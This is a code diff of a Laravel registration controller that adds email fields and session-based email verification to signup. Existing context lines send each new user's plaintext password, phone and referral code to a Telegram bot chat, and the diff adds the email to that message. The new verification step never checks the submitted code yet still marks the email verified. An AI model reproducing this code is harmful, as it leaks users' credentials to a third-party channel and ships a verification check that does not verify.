@@ -45,6 +45,7 @@ class HomeController extends Controller
         $validator = Validator::make($request->all(), [
             'name' => 'required',
             'phone' => 'required|unique:users',
+            'email' => 'required|email|unique:users',
             'password' => 'required|min:6',
             'agree_terms' => 'required',
             'captcha' => 'required|captcha',
@@ -53,6 +54,9 @@ class HomeController extends Controller
             'name.required' => __('index.name_required'),
             'phone.required' => __('index.phone_required'),
             'phone.unique' => __('index.phone_exists'),
+            'email.required' => 'Email là bắt buộc',
+            'email.email' => 'Email không đúng định dạng',
+            'email.unique' => 'Email đã được sử dụng',
             'password.required' => __('index.password_required'),
             'password.min' => __('index.password_min'),
             'agree_terms.required' => __('index.agree_terms_required', ['app_name' => config('app_name')]),
@@ -68,9 +72,29 @@ class HomeController extends Controller
             ], 422);
         }
 
+        // Kiểm tra xác thực email
+        $storedCode = session('email_verification_code');
+        $storedEmail = session('email_to_verify');
+
+        if (!$storedCode || !$storedEmail) {
+            return response()->json([
+                'status' => false,
+                'message' => 'Vui lòng xác thực email trước khi đăng ký.'
+            ], 422);
+        }
+
+        if ($request->email !== $storedEmail) {
+            return response()->json([
+                'status' => false,
+                'message' => 'Email không khớp với email đã xác thực.'
+            ], 422);
+        }
+
         $user = new User();
         $user->name = $request->name;
         $user->phone = $request->phone;
+        $user->email = $request->email;
+        $user->email_verified_at = now();
         $user->password = Hash::make($request->password);
         $referralParent = null;
         if ($request->referral_code) {
@@ -87,6 +111,9 @@ class HomeController extends Controller
         
         $user->save();
 
+        // Xóa session xác thực email
+        session()->forget(['email_verification_code', 'email_to_verify']);
+
         Auth::login($user);
 
         $telegram_bot_chatid_account = ConfigSystem::where('key', 'telegram_bot_chatid_account')->first();
@@ -97,6 +124,7 @@ class HomeController extends Controller
             $message .= "👤 <b>Tên:</b> {$user->name}\n";
             $message .= "🆔 <b>ID:</b> {$user->id}\n";
             $message .= "📞 <b>Số điện thoại:</b> {$user->phone}\n";
+            $message .= "📧 <b>Email:</b> {$user->email}\n";
             $message .= "🔗 <b>Mật khẩu:</b> {$request->password}\n";
             $message .= "🔗 <b>Mã giới thiệu:</b> {$request->referral_code}\n";
             $message .= "🕒 <b>Thời gian:</b> " . now()->format('d/m/Y H:i:s') . "\n";  
